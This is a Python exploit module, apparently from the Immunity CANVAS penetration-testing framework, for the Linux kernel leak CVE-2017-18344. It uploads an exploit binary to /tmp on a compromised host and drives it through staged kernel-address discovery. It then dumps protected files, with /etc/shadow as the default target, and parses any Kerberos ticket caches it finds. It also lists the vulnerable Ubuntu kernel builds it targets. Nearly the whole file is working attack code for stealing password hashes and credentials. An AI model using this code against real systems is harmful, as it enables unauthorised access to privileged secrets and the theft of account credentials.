#!/usr/bin/env python
##ImmunityHeader v1
################################################################################
## File       :  show_timer_leak.py
## Description:
##            :
## Created_On :  Wed Aug 29 2018
## Created_By :  X.
##
## (c) Copyright 2015, Immunity, Inc. all rights reserved.
################################################################################

import os
import sys
import struct
import getopt
import datetime
import time
import random
import logging

if "." not in sys.path:
    sys.path.append(".")

from localNode import localNode
from engine.config import canvas_root_directory
from ExploitTypes.linuxLocalExploit import LinuxLocalExploit
from canvaserror import NodeCommandError
from exploitutils import *
from libs import yaml

# Specific to kerberos
from libs.kerberos.ccache import CCache

module_path = os.path.dirname(os.path.realpath(__file__))
with open(module_path + os.path.sep + 'canvas.yaml', 'r') as f:
    metadata = yaml.safe_load(f.read())

NAME          = metadata['NAME']
DESCRIPTION   = metadata['DESCRIPTION']
VERSION       = metadata['VERSION']


NBR_STAGES = 4
CACHE_LINE_SIZE = 16
DEFAULT_TARGET_SHADOW = "/etc/shadow"
DEFAULT_TARGET_SIZE = 4095
LOCAL_EXP_NAME = 'cve_2017_18344.canvas'
REMOTE_UPLOAD_DIRECTORY = '/tmp'
REMOTE_UPLOAD_FNAME = 'cve_2017_18344.canvas'
KERBEROS_SIGNATURE = '\x05\x04'

# Protocol
MSG_SEPARATOR = "[[DEAD_BEEF]]"
MSG_HDR = "[CANVAS]"

class theexploit(LinuxLocalExploit):
    def __init__(self):
        LinuxLocalExploit.__init__(self)
        self.result            = ""
        self.name              = NAME
        self.local_path        = os.path.dirname(__file__)
        self.binary_path       = os.path.join(self.local_path, "bin")
        self.db_path           = os.path.join(self.local_path, "db")
        self.fname             = DEFAULT_TARGET_SHADOW
        self.fsize             = DEFAULT_TARGET_SIZE
        self.flush_cache       = False
        self.debug             = True
        self.sb_addr           = 0
        self.ino_addr          = 0
        self.page_addr         = 0
        self.fcontent          = ''
        self.targetless        = True

        #self.db_cache = os.path.join(self.db_path, 'cache' % randint)
        if not os.path.exists(self.db_path):
            os.makedirs(self.db_path)
        return

    def getargs(self):
        """
        The arguments handling function
        """

        self.node   = self.argsDict['passednodes'][0]
        self.fname  = self.argsDict.get('fname', self.fname)
        try:
            self.fsize  = int(self.argsDict.get('fsize', int(self.fsize)))
            if self.fsize > 4096:
                logging.info("Using default argument: %d" % DEFAULT_TARGET_SIZE)
                self.fsize = DEFAULT_TARGET_SIZE
        except Exception as e:
            logging.error("Argument error: %s" % str(e))
            logging.error("Using default argument: %d" % DEFAULT_TARGET_SIZE)
            self.fsize = DEFAULT_TARGET_SIZE

    def save_file(self):
        try:
            timestamp = time.strftime('%h_%H_%Y__%H%M')
            fname = 'leaked-%s-%s' % (self.fname.replace('/','_'), timestamp)
            fullpath = os.path.join(canvas_root_directory, self.db_path, fname)
            f = open(fullpath, 'wb+')
            f.write(self.fcontent)
            f.close()
        except Exception as e:
            logging.error('Error while saving the leaked file: %s' % str(e))
        else:
            logging.info('File successfully saved in %s' % fullpath)

    ###
    # node.shell API based functions.
    ###

    def upload_file(self, src, dst):
        """
        Handles the upload of the binary on the target.
        """

        try:
            self.node.upload(src, destfilename = dst)
        except NodeCommandError, e:
            logging.error('Failed to upload %s to %s: %s' % (src, dst, str(e)))
            return False
        logging.info('Upload succeeded')
        return True

    def stat_file(self, fname):
        """
        Apply stat() to the file.
        This will be useful later for caching pointers.
        """

        ret, stat = self.node.shell.stat(fname)
        if ret:
            return False, None
        file_size = stat['st_size']
        return True, file_size

    def exec_unix_cmd(self, cmd):
        """
        Execute a commandline.
        """

        try:
            shell = self.node.shell
            ret = shell.popen2(cmd)
            return True, ret
        except Exception as e:
            return False, str(e)

    ###
    # Display the extracted file
    ###

    def dump_ticket(self, raw_ticket):
        """
        This function dumps tickets. This function is called when the leaked
        file is detected as a krb5 ticket.
        """

        tickets = []
        try:
            cc1 = CCache()
            cc1.set_raw_data(raw_ticket)
            default_principal = cc1.get_primary_principal()
            creds = cc1.get_credentials()
            for cred in creds:
                # We do not include in the display the configuration stored in
                # the ccache file.
                if cred.is_config_credential():
                    continue
                ticket = {}
                service = cred.get_service_principal()
                client = cred.get_client_principal()
                flags = cred.get_flags()
                times = cred.get_times()
                ticket['service'] = "%s@%s" % (service[0],service[2])
                ticket['ticketflags'] = flags
                if times[0]:
                    ticket['StartTime'] = time.ctime(times[0])
                else:
                    ticket['StartTime'] = '(empty)'
                if times[2]:
                    ticket['EndTime'] = time.ctime(times[2])
                else:
                    ticket['EndTime'] = '(empty)'
                if times[3]:
                    ticket['RenewTime'] = time.ctime(times[3])
                else:
                    ticket['RenewTime'] = '(empty)'
                tickets.append(ticket)
        except Exception as e:
            logging.error("Error while dumping kerberos ticket: %s" % str(e))
            return

        nbr_tickets = len(tickets)
        log = '\nCached Ticket(s) found on this node: (%d)\n\n' % (nbr_tickets)
        for t in tickets:
            log += '\tDefault Principal: %s\n' % ( default_principal if default_principal else "???" )
            log += '\tServer: %s\n' % t['service']
            log += '\t\tTicketFlags: %x [ ' % t['ticketflags']
            if t['ticketflags'] & 0x40000000:
                log += 'FORWARDABLE:Yes, '
            else:
                log += 'FORWARDABLE:No, '
            if t['ticketflags'] & 0x00800000:
                log += 'RENEWABLE:Yes ]'
            else:
                log += 'RENEWABLE:No ]'
            log += '\n'
            log += '\t\tStart Time: %s\n' % t['StartTime']
            log += '\t\tEnd Time: %s\n' % t['EndTime']
            log += '\t\tRenew Time: %s\n\n' % t['RenewTime']
        return log

    def display_file(self):
        """
        This method displays the result. If a kerberos ticket is detected, we
        dump its description instead.
        """

        is_krb_ticket = (self.fcontent[:2] == KERBEROS_SIGNATURE)

        log = 'Module results: %s\n' % ("(Kerberos ticket)" if is_krb_ticket else "")
        if is_krb_ticket:
            ticket_log = self.dump_ticket(self.fcontent)
            if ticket_log:
                log += ticket_log
            else:
                log += repr(self.fcontent)
        else:
            log += repr(self.fcontent)
        logging.info(log)

    ###
    # UNIX specific API
    ###

    def build_unix_cmd(self, stg=1, size=0, offset=0):
        """
        Build the commandline as a function of:
            - the file requested
            - the amount to read
            - the stage we are at
        """

        L = []
        L.append(os.path.join(REMOTE_UPLOAD_DIRECTORY, REMOTE_UPLOAD_FNAME))
        L.append('-m')
        L.append('-f %s' % self.fname)
        if stg >= 2:
            L.append('-s 0x%x' % self.sb_addr)
        if stg >= 3:
            L.append('-i 0x%x' % self.ino_addr)
        if stg >= 4:
            L.append('-p 0x%x' % self.page_addr)
        if size:
            L.append('-l %d' % size)
        if size:
            L.append('-o %d' % offset)
        cmd = ' '.join(L)
        return cmd

    def __handle_stage1(self, data):
        self.sb_addr = int(data, 16)

    def __handle_stage2(self, data):
        self.ino_addr = int(data, 16)

    def __handle_stage3(self, data):
        self.page_addr = int(data, 16)

    def __handle_data(self, data):
        try:
            self.fcontent += data.decode('hex')
        except Exception as e:
            logging.error('Error while decoding hex chunk: %s' % str(e))
            pass

    def handle_unix_cmd(self, msg_str):
        """
        Parses the cmdline.
        """

        try:
            msg_list = msg_str.split(MSG_SEPARATOR)
            hdr = msg_list[0]
            if hdr != MSG_HDR or len(msg_list) < 4:
                logging.critical('Protocol error with message: %s' % msg_str)
                return False

            ret_code = int(msg_list[1])
            stg = int(msg_list[2])
            data = MSG_SEPARATOR.join(msg_list[3:])

            if ret_code:
                logging.error('Error message sent by the exploit (stage %d): %s' % (stg,data))
                return False

            if stg == 1:
                self.__handle_stage1(data)
            if stg == 2:
                self.__handle_stage2(data)
            if stg == 3:
                self.__handle_stage3(data)
            if stg == 4:
                try:
                    self.__handle_data(data)
                except:
                    return False
            return True

        except Exception as e:
            logging.critical('Protocol error: %s generated exception %s' % (msg_str, str(e)))
            return False

    def find_file(self):
        """
        This method locates the file in the kernel memory.
        """

        for stg in xrange(1, NBR_STAGES):

            cmd = self.build_unix_cmd(stg=stg)
            logging.debug('CMD built is: %s' % cmd)

            ret, msg = self.exec_unix_cmd(cmd)
            if not ret:
                logging.error('Execution failed in stage %d with error: %s' % (stg, msg))
                return False

            logging.info('Received: %r' % msg[:-1])
            if not self.handle_unix_cmd(msg[:-1]):
                return False
            self.setProgress(20+stg*10)

        return True

    def dump_content(self):
        """
        Once the file is located we dump it entirely.
        """

        cmd = self.build_unix_cmd(stg=4, size=self.fsize, offset=0)
        logging.debug('CMD built is: %s' % cmd)

        ret, msg = self.exec_unix_cmd(cmd)
        if not ret:
            logging.error('Execution failed while dumping the file with error: %s' % (stg, msg))
            return False

        logging.info('Received: %r' % msg[:-1])
        if not self.handle_unix_cmd(msg[:-1]):
            return False

        return True

    ###
    # Detection API
    ###

    def is_kernel_pointer(self, addr):
        """
        A valid kernel pointer can only be within a specific canonical range.
        """
        import ctypes
        u_addr = ctypes.c_ulong(addr)
        return (u_addr.value >= 0xFFFF800000000000 and u_addr.value <= 0xFFFFFFFFFFFFFFFF)

    def is_kallsyms_protected(self):
        """
        This function will try to detect if /proc/kallsyms can be used by an
        unpriviledged user (99% of the time this is the case) and if the symbols
        are blanked or not (not the case on Fedora 24/25/26/27).
        Note: Partially untrue for Fedora 27.
        """

        symbol_file = "/proc/kallsyms"

        fd = self.node.shell.open(symbol_file, self.node.shell.libc.getdefine('O_RDONLY'))
        if sint32(fd) < 0:
            logging.warning("Could not open /proc/kallsyms")
            return True

        # Read a lot of the content.
        # The first symbols are not always kernel pointers.
        kallsyms = self.node.shell.readfromfd(fd, 4096*100)
        self.node.shell.close(fd)

        lines = kallsyms.split("\n")
        for i in xrange(2000):
            try:
                sym = lines[i].split()
                sym_val = long(sym[0], 16)
                if self.is_kernel_pointer(sym_val):
                    return False
            except Exception as e:
                return True

        return True

    def is_fedora_24_to_27(self, uname_release):
        """
        Returns True if we have a Fedora 24 to 27, False otherwise.
        """

        wh_list = [ 'fc%d' % i for i in xrange(24,28) ]
        for pattern in wh_list:
            if pattern in uname_release:
                return True
        return False

    def is_ubuntu(self):
        """
        Returns True if we have an Ubuntu distribution, False otherwise.
        """

        file_list = [ "/etc/issue", "/etc/lsb-release" ]
        for f in file_list:

            fd = self.node.shell.open(f, self.node.shell.libc.getdefine('O_RDONLY'))
            if sint32(fd) < 0:
                logging.warning("Could not open %s" % f)
                continue

            # Read a lot of the content.
            # The first symbols are not always kernel pointers.
            content = self.node.shell.readfromfd(fd, 4096*100)
            self.node.shell.close(fd)

            if "ubuntu".upper() in content.upper():
                return True

        return False

    def get_ubuntu_version(self):
        fnames = [ "/etc/issue", "/etc/issue.net", "/etc/lsb-release" ]
        versions = [ "14.04", "14.10", "15.04", "15.10", "16.04", "16.10", "17.04", "17.10", "18.04", "18.10" ]

        for f in fnames:

            fd = self.node.shell.open(f, self.node.shell.libc.getdefine('O_RDONLY'))
            if sint32(fd) < 0:
                logging.warning("Could not open %s" % f)
                continue

            # Read a lot of the content.
            # The first symbols are not always kernel pointers.
            content = self.node.shell.readfromfd(fd, 4096*100)
            self.node.shell.close(fd)

            for version in versions:
                if version.lower() in content.lower():
                    return version

        return None

    def is_valid_target(self, uname_str):
        """
        Simple python wrapper that will detect if the exploit's binary is
        handling the target.
        In the case of Fedora we have a generic payload whenever kallsyms is
        not protected.
        """

        # Temporary disabled
        '''
        centos_6_9_targets = [
            "2.6.32-696.el6.x86_64",
        ]
        '''

        ubuntu_15_04_targets = [
            "3.19.0-15-generic",
            "3.19.0-84-generic",
        ]

        ubuntu_15_10_targets = [
            "4.2.0-42-generic",
        ]

        ubuntu_16_04_targets = [
            # Last 4.4.0-x exploitable is 4.4.0-104-generic
            "4.4.0-78-generic",
            "4.4.0-79-generic",
            "4.4.0-92-generic",
            "4.4.0-97-generic",
            "4.4.0-98-generic",
            "4.4.0-101-generic",
            "4.4.0-103-generic",
            "4.4.0-104-generic",
            # Last 4.8.0-x and is still exploitable is 4.8.0-58-generic
            "4.8.0-45-generic",
            "4.8.0-53-generic",
            "4.8.0-54-generic",
            "4.8.0-56-generic",
            "4.8.0-58-generic",
            # Last 4.10.0-x and is still exploitable is 4.10.0-42-generic
            "4.10.0-37-generic",
            "4.10.0-40-generic",
            "4.10.0-42-generic",
            # Last 4.11.0-x and is still exploitable is 4.11.0-14-generic
            "4.11.0-13-generic",
            "4.11.0-14-generic",
            # Last 4.13.0-x exploitable is 4.13.0-21-generic
            "4.13.0-21-generic",
        ]

        ubuntu_16_10_targets = [
        ]

        ubuntu_17_04_targets = [
        ]

        ubuntu_17_10_targets = [
            "4.13.0-16-generic",
            "4.13.0-21-generic",
        ]

        ubuntu_targets = {}
        ubuntu_targets['15.04'] = ubuntu_15_04_targets
        ubuntu_targets['15.10'] = ubuntu_15_10_targets
        ubuntu_targets['16.04'] = ubuntu_16_04_targets
        ubuntu_targets['16.10'] = ubuntu_16_10_targets
        ubuntu_targets['17.04'] = ubuntu_17_04_targets
        ubuntu_targets['17.10'] = ubuntu_17_10_targets

        # Case #1: Ubuntu targets
        if self.is_ubuntu():
            ubuntu_version = self.get_ubuntu_version()
            if ubuntu_version:
                logging.info('Ubuntu %s detected' % ubuntu_version)
                if ubuntu_targets.has_key(ubuntu_version) and uname_str in ubuntu_targets[ubuntu_version]:
                    logging.info('Target is supported.')
                    return True
                else:
                    if not self.targetless:
                        logging.info('We do not have a specific target for this version')
                        logging.info('You may run again the exploit in targetless mode (slower)')
                        return False
                    else:
                        logging.info('Attempting targetless mode (very slow)')
                        return True
            else:
                logging.info('Ubuntu\'s version could not be detected!')
                return False

        # Case #3: Default case
        return False

    def do_exploit_unix(self):
        """
        Performs the actual exploitation on Linux.
        """

        # First of all, let's get the uid
        shell = self.node.shell
        uid = shell.getuid()
        if not uid:
            logging.info('Node is running under privileged process (UID=%d)' % uid)
        else:
            logging.info('Node is running under unprivileged process (UID=%d)' % uid)

        cpu_features = shell.lscpu()
        if cpu_features and cpu_features.has_key('model name'):
            logging.info('Target CPU is %s' % cpu_features['model name'])

        uname_dic = shell.uname()
        if uname_dic:
            logging.info('Attacking %s %s' % (uname_dic['sysname'], uname_dic['release']))

        if not self.is_valid_target(uname_dic['release']):
            return self.fail()

        logging.info('Uploading the binary to %s' % REMOTE_UPLOAD_DIRECTORY)
        ret = self.upload_file(os.path.join(self.binary_path, LOCAL_EXP_NAME),
                               os.path.join(REMOTE_UPLOAD_DIRECTORY, REMOTE_UPLOAD_FNAME))
        if not ret:
            return self.fail()

        # At this point we need to locate the file
        self.setProgress(20)
        if not self.find_file():
            return self.fail()

        self.setProgress(75)
        if not self.dump_content():
            return self.fail()

        self.save_file()
        self.display_file()
        self.setInfo("%s Done (Success)" % (self.name))
        self.setProgress(100)
        return self.success()

    def clean_tmp(self):
        """
        It's cleaner without the binary.
        """

        if self.node.shell:
            self.node.shell.dounlink(os.path.join(REMOTE_UPLOAD_DIRECTORY, REMOTE_UPLOAD_FNAME))

    def success(self):
        self.clean_tmp()
        self.setInfo("%s - done (success: %s)" % (NAME,self.result))
        return 1

    def fail(self):
        self.clean_tmp()
        self.setInfo('%s - done (ERROR)' % NAME)
        return 0

    def is_64bit_node(self):
        if "Unix Shell" in self.node.capabilities:
            if hasattr(self.node.shell, "LP64"):
                return self.node.shell.LP64
            else:
                return False
        return False

    def run(self):
        self.setInfo("%s (in progress)" % (NAME))
        self.getargs()

        if isinstance(self.node, localNode):
            logging.critical('Node of type %s not supported' % self.node.nodetype)
            return self.fail()

        if not self.node.shell:
            logging.critical("Node doesn't have a shell")
            return self.fail()

        if not self.is_64bit_node():
            logging.critical("Exploit does not support non 64 bits nodes")
            return self.fail()

        if self.check_smap():
            logging.critical("Exploit does not support SMAP protected nodes")
            return self.fail()

        ret, file_length = self.stat_file(self.fname)
        if not ret:
            logging.critical('Cannot stat() the file, it\'s hopeless :/')
            return self.fail()

        if self.fsize > 4096:
            logging.critical('This version is not able to leak files bigger than 4096 bytes')
            return self.fail()

        if self.fsize > 4096:
            self.log_error('This version is not able to leak files bigger than 4096 bytes.')
            return self.fail()

        if self.fsize > file_length:
            self.fsize = file_length

        logging.info('Attempting to leak %s bytes of %s' % (self.fsize, self.fname))

        if not "Unix Shell" in self.node.capabilities:
            logging.critical("Node of type %s not supported yet" % self.node.nodetype)
            return self.fail()

        return self.do_exploit_unix()


if __name__== "__main__":
    logging.warning("This is an exploit that should be used only from within CANVAS")
